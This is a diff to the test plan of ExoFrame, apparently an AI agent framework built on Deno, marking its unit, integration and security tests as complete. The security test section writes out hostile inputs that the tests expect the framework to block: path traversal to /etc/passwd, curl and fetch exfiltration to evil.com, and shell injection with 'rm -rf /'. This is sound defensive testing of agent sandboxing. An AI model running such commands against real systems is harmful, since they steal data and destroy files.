@@ -53,22 +53,28 @@ ExoFrame follows a **test pyramid** approach:
 
 **Purpose:** Verify individual components work correctly in isolation.
 
-**Location:** `tests/` (mirroring `src/` structure)
+**Location:** `tests/` (flat structure with `cli/`, `docs/`, `obsidian/` subdirs)
 
 **Coverage Target:** 70% for core modules
 
-| Module           | Test File                              | Priority |
-| ---------------- | -------------------------------------- | -------- |
-| Config loader    | `tests/config_test.ts`                 | P0       |
-| YAML parser      | `tests/parsers/yaml_parser_test.ts`    | P0       |
-| Security service | `tests/security_test.ts`               | P0       |
-| Database service | `tests/database_test.ts`               | P0       |
-| Lease manager    | `tests/leases/lease_manager_test.ts`   | P0       |
-| File watcher     | `tests/watcher/watcher_test.ts`        | P1       |
-| Context loader   | `tests/context/context_loader_test.ts` | P1       |
-| Git service      | `tests/git/git_service_test.ts`        | P1       |
-| Blueprint parser | `tests/blueprints/blueprint_test.ts`   | P1       |
-| CLI commands     | `tests/cli/*_test.ts`                  | P2       |
+| Module                  | Test File                        | Priority | Status      |
+| ----------------------- | -------------------------------- | -------- | ----------- |
+| Config loader           | `tests/config_test.ts`           | P0       | ✅ Complete |
+| Frontmatter/YAML parser | `tests/frontmatter_test.ts`      | P0       | ✅ Complete |
+| Database service        | `tests/db_test.ts`               | P0       | ✅ Complete |
+| File watcher            | `tests/watcher_test.ts`          | P1       | ✅ Complete |
+| Context loader          | `tests/context_loader_test.ts`   | P1       | ✅ Complete |
+| Git service             | `tests/git_service_test.ts`      | P1       | ✅ Complete |
+| Agent runner            | `tests/agent_runner_test.ts`     | P1       | ✅ Complete |
+| Execution loop          | `tests/execution_loop_test.ts`   | P1       | ✅ Complete |
+| Mission reporter        | `tests/mission_reporter_test.ts` | P1       | ✅ Complete |
+| Plan writer             | `tests/plan_writer_test.ts`      | P1       | ✅ Complete |
+| Tool registry           | `tests/tool_registry_test.ts`    | P1       | ✅ Complete |
+| Path resolver           | `tests/path_resolver_test.ts`    | P1       | ✅ Complete |
+| Context card generator  | `tests/context_card_test.ts`     | P2       | ✅ Complete |
+| Model adapter           | `tests/model_adapter_test.ts`    | P2       | ✅ Complete |
+| CLI commands            | `tests/cli/*_test.ts`            | P2       | ✅ Complete |
+| Obsidian integration    | `tests/obsidian/*_test.ts`       | P2       | ✅ Complete |
 
 **Running Unit Tests:**
 
@@ -104,18 +110,18 @@ temporary directories created during daemon tests.
 
 **v1.0 Scenarios:**
 
-| #  | Scenario                | Description                                 | Validates            |
-| -- | ----------------------- | ------------------------------------------- | -------------------- |
-| 1  | **Happy Path**          | Request → Plan → Approve → Execute → Report | Core workflow        |
-| 2  | **Plan Rejection**      | Request → Plan → Reject → Archive           | Rejection flow       |
-| 3  | **Plan Revision**       | Request → Plan → Revise → New Plan          | Revision flow        |
-| 4  | **Execution Failure**   | Approved plan fails during execution        | Error handling       |
-| 5  | **Concurrent Requests** | Multiple requests processed simultaneously  | Race conditions      |
-| 6  | **Context Overflow**    | Request references 50 large files           | Graceful truncation  |
-| 7  | **Git Conflict**        | Agent and human edit same file              | Conflict detection   |
-| 8  | **Daemon Restart**      | Daemon killed mid-execution                 | State recovery       |
-| 9  | **Portal Access**       | Request accesses portal files               | Security enforcement |
-| 10 | **Invalid Input**       | Malformed YAML frontmatter                  | Input validation     |
+| #  | Scenario                | Description                                 | Validates            | Status      |
+| -- | ----------------------- | ------------------------------------------- | -------------------- | ----------- |
+| 1  | **Happy Path**          | Request → Plan → Approve → Execute → Report | Core workflow        | ✅ Complete |
+| 2  | **Plan Rejection**      | Request → Plan → Reject → Archive           | Rejection flow       | ✅ Complete |
+| 3  | **Plan Revision**       | Request → Plan → Revise → New Plan          | Revision flow        | ✅ Complete |
+| 4  | **Execution Failure**   | Approved plan fails during execution        | Error handling       | ✅ Complete |
+| 5  | **Concurrent Requests** | Multiple requests processed simultaneously  | Race conditions      | ✅ Complete |
+| 6  | **Context Overflow**    | Request references 50 large files           | Graceful truncation  | ✅ Complete |
+| 7  | **Git Conflict**        | Agent and human edit same file              | Conflict detection   | ✅ Complete |
+| 8  | **Daemon Restart**      | Daemon killed mid-execution                 | State recovery       | ✅ Complete |
+| 9  | **Portal Access**       | Request accesses portal files               | Security enforcement | ✅ Complete |
+| 10 | **Invalid Input**       | Malformed YAML frontmatter                  | Input validation     | ✅ Complete |
 
 **Test Structure:**
 
@@ -174,50 +180,67 @@ deno test tests/integration/ --reporter=verbose
 
 **Purpose:** Verify Deno permission enforcement and path security.
 
-**Location:** `tests/security/`
-
-**Attack Scenarios:**
-
-| Attack Vector            | Test                            | Expected Defense             |
-| ------------------------ | ------------------------------- | ---------------------------- |
-| **Path Traversal**       | Read `../../../etc/passwd`      | `PermissionDenied` from Deno |
-| **Portal Escape**        | Symlink pointing to `/etc`      | Path validation rejects      |
-| **Network Exfiltration** | Agent calls `fetch('evil.com')` | `PermissionDenied`           |
-| **Env Variable Theft**   | Read `API_KEY` env var          | Only `EXO_*` vars allowed    |
-| **Shell Injection**      | Command with `; rm -rf /`       | Command allowlist blocks     |
-| **File Overwrite**       | Write to `/System/journal.db`   | Write path validation        |
-
-**Test Implementation:**
-
-```typescript
-// tests/security/permission_test.ts
-Deno.test("Agent cannot read outside workspace", async () => {
-  const result = await runAgentWithPermissions(
-    { read: ["/ExoFrame"] },
-    `Deno.readTextFile("/etc/passwd")`,
-  );
-
-  assertEquals(result.exitCode, 1);
-  assertStringIncludes(result.stderr, "PermissionDenied");
-});
-
-Deno.test("Agent cannot access unauthorized network", async () => {
-  const result = await runAgentWithPermissions(
-    { net: ["api.anthropic.com"] },
-    `fetch("https://evil.com/exfil")`,
-  );
-
-  assertEquals(result.exitCode, 1);
-  assertStringIncludes(result.stderr, "PermissionDenied");
-});
-```
+**Location:** Tests are distributed across relevant test files with `[security]` label for filtering.
 
 **Running Security Tests:**
 
 ```bash
-# Run security tests (requires strict permissions)
-deno test tests/security/ --allow-read=. --allow-run
+# Run all security tests
+deno task test:security
+
+# Or manually with filter
+deno test --allow-all --filter "[security]" tests/
 ```
+
+**Attack Scenarios & Coverage:**
+
+| Attack Vector            | Test File                        | Test Count | Status      |
+| ------------------------ | -------------------------------- | ---------- | ----------- |
+| **Path Traversal**       | `tests/path_resolver_test.ts`    | 5 tests    | ✅ Complete |
+| **Portal Escape**        | `tests/path_resolver_test.ts`    | 2 tests    | ✅ Complete |
+| **File System Escape**   | `tests/tool_registry_test.ts`    | 6 tests    | ✅ Complete |
+| **Shell Injection**      | `tests/tool_registry_test.ts`    | 4 tests    | ✅ Complete |
+| **Network Exfiltration** | `tests/tool_registry_test.ts`    | 1 test     | ✅ Complete |
+| **Env Variable Theft**   | `tests/config_test.ts`           | 4 tests    | ✅ Complete |
+| **Cross-Portal Access**  | `tests/integration/09_*_test.ts` | 4 tests    | ✅ Complete |
+
+**Total:** 29 security tests (filtered via `[security]` label)
+
+**Test Implementation Examples:**
+
+```typescript
+// tests/tool_registry_test.ts
+Deno.test("[security] ToolRegistry: read_file - blocks path traversal to /etc/passwd", async () => {
+  const registry = new ToolRegistry({ config, db });
+  const result = await registry.execute("read_file", {
+    path: "../../../etc/passwd",
+  });
+  assertEquals(result.success, false, "Path traversal should be blocked");
+});
+
+Deno.test("[security] ToolRegistry: run_command - blocks curl/wget for data exfiltration", async () => {
+  const registry = new ToolRegistry({ config, db });
+  const result = await registry.execute("run_command", {
+    command: "curl",
+    args: ["https://evil.com/exfil"],
+  });
+  assertEquals(result.success, false, "curl should be blocked");
+});
+
+// tests/config_test.ts
+Deno.test("[security] Env Variable Security: Verify sensitive env vars are not in config", () => {
+  // Verifies API_KEY, AWS_SECRET_ACCESS_KEY, etc. are not exposed
+});
+```
+
+**Deno Permission Model:**
+
+The production daemon (`deno task start:fg`) runs with restricted permissions:
+
+- `--allow-read=.` — Only workspace directory
+- `--allow-write=.` — Only workspace directory
+- `--allow-net=api.anthropic.com,api.openai.com,localhost:11434` — Only LLM APIs
+- `--allow-env=EXO_,HOME,USER` — Only EXO_* vars and identity
 
 ---
 
@@ -586,19 +609,18 @@ deno task test:all
 
 | Category                | Items                                                                | Status      |
 | ----------------------- | -------------------------------------------------------------------- | ----------- |
-| **Unit Tests**          | Config, Security, Database, Leases, Watcher                          | 🔲 Planned  |
-| **Integration Tests**   | Scenarios 1-5 (Happy Path, Rejection, Revision, Failure, Concurrent) | 🔲 Planned  |
-| **Security Tests**      | Path traversal, Network exfil, Env theft                             | 🔲 Planned  |
+| **Unit Tests**          | Config, Database, Watcher, Context Loader, Git Service + 12 more     | ✅ Complete |
+| **Integration Tests**   | Scenarios 1-10 (all 10 scenarios implemented)                        | ✅ Complete |
+| **Security Tests**      | Path traversal, Network exfil, Env theft, Shell injection (29 tests) | ✅ Complete |
 | **Documentation Tests** | User Guide sections, CLI coverage                                    | ✅ Complete |
 | **Manual QA**           | All 10 scenarios on Ubuntu                                           | 🔲 Planned  |
 
 ### 5.2 In Scope (Should Have)
 
-| Category                   | Items                                                 | Status     |
-| -------------------------- | ----------------------------------------------------- | ---------- |
-| **Integration Tests**      | Scenarios 6-10 (Context overflow, Git conflict, etc.) | 🔲 Planned |
-| **Performance Benchmarks** | Cold start, Watcher latency                           | 🔲 Planned |
-| **Manual QA**              | macOS, Windows WSL2                                   | 🔲 Planned |
+| Category                   | Items                       | Status     |
+| -------------------------- | --------------------------- | ---------- |
+| **Performance Benchmarks** | Cold start, Watcher latency | 🔲 Planned |
+| **Manual QA**              | macOS, Windows WSL2         | 🔲 Planned |
 
 ### 5.3 Out of Scope (v1.1+)
 
